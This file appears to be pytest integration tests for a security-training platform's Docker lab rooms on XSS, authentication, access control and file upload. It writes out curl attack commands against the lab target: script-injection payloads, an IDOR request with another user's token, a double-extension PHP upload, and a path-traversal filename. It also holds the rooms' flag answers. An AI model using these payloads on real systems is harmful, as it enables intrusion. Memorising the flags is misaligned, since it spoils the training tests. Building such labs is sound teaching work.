"""
Genuine Docker Lab Integration Tests for Red Team Rooms 10–13:
- Room 10: Cross-Site Scripting (XSS) (red-10-cross-site-scripting)
- Room 11: Authentication Attacks (red-11-authentication-attacks)
- Room 12: Access Control Testing (red-12-access-control-testing)
- Room 13: File Upload Vulnerabilities (red-13-file-upload-vulnerabilities)
Tests live container duo communicating over isolated internal bridge network (10.10.14.0/24).
"""

import pytest
from backend.app.labs.docker_runner import DockerLabRunner


@pytest.fixture(scope="module")
def docker_runner():
    runner = DockerLabRunner()
    if not runner.is_available():
        pytest.skip("Docker daemon is not operational on this host. Skipping Docker lab tests.")
    return runner


@pytest.mark.asyncio
async def test_docker_room_10_xss(docker_runner):
    """Room 10: Reflected XSS, stored comments, attribute injection challenge, CSP/encoding remediation."""
    session_id = "test_docker_room_10_live"
    info = await docker_runner.start_session(session_id, "red-10-cross-site-scripting", "op-tester-10")
    assert info.status == "RUNNING"
    assert info.runner_mode == "docker"
    target_ip = info.target_ip

    try:
        # 1. Reflected XSS query
        ref_out = await docker_runner.execute_command(
            session_id,
            f'curl -s "http://{target_ip}:8091/reflected?q=<script>alert(1)</script>"'
        )
        assert "NOENTRY{xss_reflected_script_execution_4821}" in ref_out

        # 2. Stored XSS comment submission
        stored_out = await docker_runner.execute_command(
            session_id,
            f'curl -s -X POST http://{target_ip}:8091/comments -d "author=attacker&comment=<script>alert(1)</script>"'
        )
        assert "NOENTRY{xss_stored_comment_payload_9104}" in stored_out

        # 3. Attribute injection context challenge
        chal_out = await docker_runner.execute_command(
            session_id,
            f'curl -s "http://{target_ip}:8091/challenge?theme=\\"onmouseover=\\"alert(1)"'
        )
        assert "NOENTRY{xss_context_encoding_defense_6623}" in chal_out

        # 4. Remediation POST enabling HTML escaping and CSP
        rem_out = await docker_runner.execute_command(
            session_id,
            f"curl -s -X POST http://{target_ip}:8091/remediate"
        )
        assert "NOENTRY{xss_output_encoding_remediation_7812}" in rem_out

    finally:
        await docker_runner.stop_session(session_id)


@pytest.mark.asyncio
async def test_docker_room_11_authentication(docker_runner):
    """Room 11: Dictionary attack with local wordlist, telemetry log audit, lockout policy, rate limiting remediation."""
    session_id = "test_docker_room_11_live"
    info = await docker_runner.start_session(session_id, "red-11-authentication-attacks", "op-tester-11")
    assert info.status == "RUNNING"
    assert info.runner_mode == "docker"
    target_ip = info.target_ip

    try:
        # 1. Inspect attacker workstation password wordlist
        wordlist_out = await docker_runner.execute_command(session_id, "cat /home/operator/wordlists/passwords.txt")
        assert "voltcorp2024" in wordlist_out

        # 2. Successful dictionary login
        login_out = await docker_runner.execute_command(
            session_id,
            f'curl -s -X POST http://{target_ip}:8092/api/login -d "username=support&password=voltcorp2024"'
        )
        assert "NOENTRY{auth_brute_force_dictionary_7190}" in login_out

        # 3. Telemetry log analysis
        logs_out = await docker_runner.execute_command(session_id, f"curl -s http://{target_ip}:8092/api/logs")
        assert "NOENTRY{auth_log_analysis_telemetry_3481}" in logs_out

        # 4. Lockout policy challenge
        chal_out = await docker_runner.execute_command(
            session_id,
            f'curl -s "http://{target_ip}:8092/challenge?action=verify_policy"'
        )
        assert "NOENTRY{auth_lockout_policy_defense_5514}" in chal_out

        # 5. Rate limiting & bcrypt remediation
        rem_out = await docker_runner.execute_command(
            session_id,
            f"curl -s -X POST http://{target_ip}:8092/api/remediate"
        )
        assert "NOENTRY{auth_rate_limiting_bcrypt_hardened_9205}" in rem_out

    finally:
        await docker_runner.stop_session(session_id)


@pytest.mark.asyncio
async def test_docker_room_12_access_control(docker_runner):
    """Room 12: Horizontal IDOR (Bob -> Doc 101), vertical privilege escalation, BOLA challenge, server-side RBAC fix."""
    session_id = "test_docker_room_12_live"
    info = await docker_runner.start_session(session_id, "red-12-access-control-testing", "op-tester-12")
    assert info.status == "RUNNING"
    assert info.runner_mode == "docker"
    target_ip = info.target_ip

    try:
        # 1. Horizontal IDOR: Bob querying Alice's confidential document 101
        idor_out = await docker_runner.execute_command(
            session_id,
            f"curl -s -H 'Authorization: Bearer bob_token' http://{target_ip}:8093/api/documents/101"
        )
        assert "NOENTRY{idor_horizontal_privilege_access_8321}" in idor_out

        # 2. Vertical Privilege Escalation: Unprivileged user querying admin users list
        vert_out = await docker_runner.execute_command(
            session_id,
            f"curl -s -H 'Authorization: Bearer bob_token' http://{target_ip}:8093/api/admin/users"
        )
        assert "NOENTRY{vertical_privilege_escalation_breach_4490}" in vert_out

        # 3. BOLA parameter tampering challenge
        chal_out = await docker_runner.execute_command(
            session_id,
            f'curl -s "http://{target_ip}:8093/challenge?account_id=101"'
        )
        assert "NOENTRY{bola_access_control_master_2951}" in chal_out

        # 4. Enforce server-side authorization remediation
        rem_out = await docker_runner.execute_command(
            session_id,
            f"curl -s -X POST http://{target_ip}:8093/api/remediate"
        )
        assert "NOENTRY{rbac_server_side_authorization_fixed_7134}" in rem_out

        # 5. Verify Bob is now blocked with 403 Forbidden
        blocked_out = await docker_runner.execute_command(
            session_id,
            f"curl -s -i -H 'Authorization: Bearer bob_token' http://{target_ip}:8093/api/documents/101"
        )
        assert "403" in blocked_out or "Access denied" in blocked_out

    finally:
        await docker_runner.stop_session(session_id)


@pytest.mark.asyncio
async def test_docker_room_13_file_upload(docker_runner):
    """Room 13: Extension bypass upload, path traversal upload, MIME spoofing challenge, magic byte hardening."""
    session_id = "test_docker_room_13_live"
    info = await docker_runner.start_session(session_id, "red-13-file-upload-vulnerabilities", "op-tester-13")
    assert info.status == "RUNNING"
    assert info.runner_mode == "docker"
    target_ip = info.target_ip

    try:
        # 1. Verify attacker uploads folder
        ls_out = await docker_runner.execute_command(session_id, "ls -la /home/operator/uploads/")
        assert "poc.php.png" in ls_out

        # 2. Upload file with executable extension bypass
        up_out = await docker_runner.execute_command(
            session_id,
            f"curl -s -F 'file=@/home/operator/uploads/poc.php.png' http://{target_ip}:8094/api/upload"
        )
        assert "NOENTRY{file_upload_extension_bypass_1892}" in up_out

        # 3. Path traversal in upload filename
        trav_out = await docker_runner.execute_command(
            session_id,
            f"curl -s -F 'file=@/home/operator/uploads/avatar.png;filename=../../uploads/poc.txt' http://{target_ip}:8094/api/upload"
        )
        assert "NOENTRY{file_upload_path_traversal_flag_6301}" in trav_out

        # 4. MIME spoofing challenge
        chal_out = await docker_runner.execute_command(
            session_id,
            f'curl -s "http://{target_ip}:8094/challenge?mime=application/x-php"'
        )
        assert "NOENTRY{upload_validation_defense_master_4029}" in chal_out

        # 5. Magic bytes & storage remediation
        rem_out = await docker_runner.execute_command(
            session_id,
            f"curl -s -X POST http://{target_ip}:8094/api/remediate"
        )
        assert "NOENTRY{file_upload_magic_bytes_secured_8832}" in rem_out

        # 6. Verify disallowed extension is now rejected
        reject_out = await docker_runner.execute_command(
            session_id,
            f"curl -s -i -F 'file=@/home/operator/uploads/poc.php.png' http://{target_ip}:8094/api/upload"
        )
        assert "400" in reject_out or "disallowed" in reject_out or "magic bytes" in reject_out

    finally:
        await docker_runner.stop_session(session_id)

